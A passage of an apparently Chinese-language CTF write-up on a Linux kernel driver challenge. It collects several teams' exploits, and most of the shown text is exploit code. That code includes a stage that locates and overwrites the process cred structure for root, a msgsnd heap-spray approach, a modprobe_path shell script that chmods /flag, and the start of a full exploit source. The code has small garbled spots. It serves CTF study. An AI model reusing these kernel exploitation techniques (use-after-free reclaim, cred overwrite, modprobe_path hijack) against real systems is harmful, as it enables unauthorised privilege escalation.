class="hljs-number">10000</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//*why the node is sizeof(node_t) aligned???</span><br>        <span class="hljs-comment">//*is there something strange in kernel slab memory manager?</span><br>        <span class="hljs-comment">//*7000~7800</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = s1_node_addr + i * <span class="hljs-number">0x80</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> value = stage3_read(ctx, fd, addr + <span class="hljs-number">0x58</span>);<br>        <span class="hljs-keyword">if</span> (value == STAGE3_READ_NUM_CHILDREN)<br>        &#123;<br>            victim_addr = addr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    assert(victim_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Victim @ 0x%lx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Findings creds\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> current = stage3_read(ctx, fd, victim_addr + <span class="hljs-number">0x10</span>); <span class="hljs-comment">// state_lock.owner</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] current = 0x%lx\n&quot;</span>, current);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_addr = stage3_read(ctx, fd, current + <span class="hljs-number">0xa90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] cred @ 0x%lx\n&quot;</span>, cred_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Crafting linkable node\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x0</span>) = <span class="hljs-number">100000</span>;              <span class="hljs-comment">// id</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">0</span>;                   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>; <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x68</span>) = victim_addr + <span class="hljs-number">0x68</span>; <span class="hljs-comment">// edges.prev (empty list)</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Building graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> graph_fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        graph_fds[i] = scratch_fds[i]; <span class="hljs-comment">// avoid allocations, they mess stuff up</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        llink(graph_fds[<span class="hljs-number">0</span>], graph_fds[i], <span class="hljs-number">0</span>);<br>    llink(graph_fds[<span class="hljs-number">0</span>], fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// weight = write primitive value (zero for root creds)</span><br>    finalize(graph_fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Freeing stage1 dist array\n&quot;</span>);<br>    <span class="hljs-comment">//*due to stage 1 child process crashed, we have no choice but this method.</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                     <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// is_finalized</span><br>                                                          <span class="hljs-comment">// fake node_array overlaps unused nb_lock</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x0</span>) = <span class="hljs-number">0</span>;             <span class="hljs-comment">// fake node_array.size</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x10</span>) = s1_dist_addr; <span class="hljs-comment">// fake node_array.nodes (will be freed)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>;  <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = victim_addr + <span class="hljs-number">0x38</span>;  <span class="hljs-comment">// traversal = fake node_array</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br>    release(fd);   <span class="hljs-comment">// free s1_dist_addr</span><br>    fd = create(); <span class="hljs-comment">// immediately reclaim victim node to restore stable state</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Overwriting cred\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> write_addr = cred_addr + <span class="hljs-number">8</span> * <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> idx = (write_addr - s1_dist_addr) / <span class="hljs-number">8</span>;<br>    reclaim_free(ctx);<br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, idx, <span class="hljs-number">0</span>);<br>    query(graph_fds[<span class="hljs-number">0</span>], graph_fds[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//kmalloc the orignal s1_dist_addr</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    assert(fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(read(fd, buf, <span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>) != <span class="hljs-number">-1</span>);<br>    close(fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;!!! FLAG: %s\n&quot;</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//*what are these?</span><br>    <span class="hljs-keyword">int</span> scratch_fds[<span class="hljs-number">12</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++)<br>        scratch_fds[i] = create();<br><br>    <span class="hljs-comment">// Leak a distance array (still malloc&#x27;ed) and the address of a live node</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr, s1_node_addr;<br>    <span class="hljs-keyword">int</span> s1_node_fd;<br>    stage1(&amp;s1_dist_addr, &amp;s1_nod e_addr, &amp;s1_node_fd);<br><br>    <span class="hljs-comment">// Get a fd that can be freed and reclaimed repeatedly</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">victim_ctx</span>;</span><br>    <span class="hljs-keyword">int</span> victim_fd;<br>    stage2(&amp;victim_ctx, &amp;victim_fd);<br><br>    <span class="hljs-comment">// Get somewhat rootish privileges</span><br>    stage3(&amp;victim_ctx, victim_fd, scratch_fds, s1_dist_addr, s1_node_addr);<br><span class="hljs-function">F4</span><br><span class="hljs-function">    <span class="hljs-title">print_flag</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>



<h3 id="来自perfectblue的exp"><a href="#来自perfectblue的exp" class="headerlink" title="来自perfectblue的exp:"></a>来自perfectblue的exp:</h3><p>mutex的结构: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> &#123;</span><br>  <span class="hljs-keyword">uint64_t</span> owner;<br>  <span class="hljs-keyword">uint64_t</span> wait_lock;<br>  <span class="hljs-keyword">void</span>* prev;<br>  <span class="hljs-keyword">void</span>* next;<br>&#125;;<br></code></pre></div></td></tr></table></figure>

<p>改进细节:</p>
<ul>
<li>第一次crash可以使用<code>refcount_warn_saturate</code>. 这样只要令refcount等于0, 就会触发finalize中的警告, 从而导致crash的产生, 不过exp中简单的使用了sleep等待线程, 以及手动输入dmesg信息. 上面一个战队的exp中解析内核日志的代码可以拿来重复利用, 免得在调试的时候浪费时间.<br>好吧这很有问题, 进入了这个函数之后寄存器值都变了. 不好评价. </li>
<li>好了, 看不懂那个leak出来的是个啥, 什么是kmalloc_32/128???也没个wp解释一下. </li>
</ul>
<h4 id="exp-略"><a href="#exp-略" class="headerlink" title="exp: 略"></a>exp: 略</h4><h3 id="来自balsn战队"><a href="#来自balsn战队" class="headerlink" title="来自balsn战队:"></a>来自balsn战队:</h3><p>仅仅两百多行, 这么简洁. </p>
<ul>
<li>crash用到了<code>refcount_warn_saturate</code>. 原因是finalize之前release会使refcount变0. </li>
<li>用到了msgsnd, 也就是kmalloc有最大和最小长度限制, 而且有一个0x30(48)字节的头部. </li>
<li>msgsnd只能控制后0x50的区域. 也就是<strong>最后四行</strong> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_t</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">uint64_t</span> id;<br>  <span class="hljs-keyword">uint64_t</span> refcount;<br>  <span class="hljs-keyword">char</span> state_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-keyword">uint64_t</span> is_finalized;<br>  <span class="hljs-keyword">char</span> nb_lock[<span class="hljs-number">32</span>];<br>  <span class="hljs-comment">//following is under control</span><br>  <span class="hljs-keyword">uint64_t</span> num_children;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head_t</span> <span class="hljs-title">edges</span>;</span><br>  <span class="hljs-keyword">uint64_t</span> traversal_idx;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node_list_t</span> *<span class="hljs-title">traversal</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>不知道怎么得出的rbx中存储kernel_heap, 不过可能是从崩溃信息中对比和真实heap最接近的一个寄存器地址. </li>
<li>用了一个很巧妙的方法来获取dis_arr的地址, 在用户区建立一个很大的缓冲区, 猜测在已有的heap地址附近, 让idx偏移越界溢出从内核地址绕回到缓冲区中, 检查哪个地址上的数据被修改就可推算真实的dis_arr. 再根据dis_arr来算出和modprobe的地址. 进而修改到shellcode函数中.<br>可行的原因为未开smep+smap. </li>
</ul>
<p>遇到的问题:</p>
<ul>
<li>读取内核错误信息莫名出错, 换成了<code>klogctl</code>才成功. 修改用参数来crash的神奇操作. 修改kernel_ret为query的返回地址在栈上的存储位置. </li>
</ul>
<p>modprobe:</p>
<p>重点在于造一个头部以未知的程序. 执行后内核自会使用<code>/tmp/y</code>处理, 不过是修改了<code>/flag</code>的权限</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span>                                           <br>echo -ne &#x27;\xffyyy&#x27; &gt; fake<br>echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/y<br>chmod +x fake<br>chmod +x /tmp/y<br>/balsn<br>/balsn<br>/balsn<br>cat /flag<br></code></pre></div></td></tr></table></figure>

<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc exp.c -o exp -static -masm=intel</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008D900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_GET_INFO 0x8018D901</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xD902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xC010D903</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAUSE scanf(<span class="hljs-meta-string">&quot;%*c&quot;</span>);</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">size_t</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> *<span class="hljs-title">fd</span>, *<span class="hljs-title">bk</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> id;<br>    <span class="hljs-keyword">size_t</span> refcount;<br>    <span class="hljs-keyword">size_t</span> state_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> finalized;<br>    <span class="hljs-keyword">size_t</span> nb_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> num_edges;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-keyword">size_t</span> index;<br>    <span class="hljs-keyword">size_t</span> tra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">dst_node</span>;</span><br>    <span class="hljs-keyword">size_t</span> weight;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fd[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// printf(&quot;Creating link between &#x27;%d&#x27; and &#x27;%d&#x27; with weight %u\n&quot;, a, b, weight);</span><br>    assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = fd[a],<br>        .fd2 = fd[b],<br>    &#125;;<br>    <span class="hljs-keyword">int</span> ret = ioctl(fd[i], SPARK_QUERY, &amp;qry);<br>    <span class="hljs-comment">// printf( &quot;[query] ret = %d\n&quot; , ret );</span><br>    <span class="hljs-comment">// printf(&quot;The length of shortest path between &#x27;%d&#x27; and &#x27;%d&#x27; is %lld\n&quot;, a, b, qry.distance);</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> buf[<span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xcc</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(ioctl(fd[a], SPARK_GET_INFO, buf) == <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[get info %d] &quot;</span>, a);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p &quot;</span>, buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_open</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    fd[i] = open(<span class="hljs-string">&quot;/dev/node&quot;</span>, O_RDWR);<br>    assert(fd[i] &gt;= <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(fd[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd[i], SPARK_FINALIZE);<br>&#125;<br><br><span class="hljs-comment">// for kmalloc</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MsgBuf</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> mtype;<br>    <span class="hljs-keyword">char</span> mtext[<span class="hljs-number">0x10000</span>]; <span class="hljs-comment">// 65536</span><br>&#125; msgbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msg_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> qid;<br>    <span class="hljs-keyword">if</span> ((qid = msgget(IPC_PRIVATE, <span 